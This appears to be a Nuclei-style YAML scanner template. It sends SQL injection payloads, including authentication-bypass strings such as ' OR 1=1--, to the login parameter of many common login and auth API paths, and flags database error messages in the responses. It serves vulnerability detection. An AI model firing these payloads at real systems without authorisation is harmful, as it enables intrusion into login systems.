http:
- body: login={{injection_payload}}&password=test123
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - SQL error code
    - Dynamic SQL Error
    - Token unknown
    - syntax error
    - mysql_fetch
    - ORA-00933
    - pg_query()
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/api/auth'
  - '{{BaseURL}}/api/auth/login'
  - '{{BaseURL}}/api/login'
  - '{{BaseURL}}/api/sign-in'
  - '{{BaseURL}}/api/sigin'
  - '{{BaseURL}}/api/v1/login'
  - '{{BaseURL}}/api/v2/login'
  - '{{BaseURL}}/api/v3/login'
  - '{{BaseURL}}/api/v1/auth'
  - '{{BaseURL}}/api/v2/auth'
  - '{{BaseURL}}/api/v3/auth'
  - '{{BaseURL}}/auth/login'
  - '{{BaseURL}}/login'
  - '{{BaseURL}}/sign-in'
  - '{{BaseURL}}/signin'
  payloads:
    injection_payload:
    - ''''
    - ''''''
    - '"'
    - ''' OR ''1''=''1'
    - ''' OR 1=1--'
    - '''; SELECT 1--'
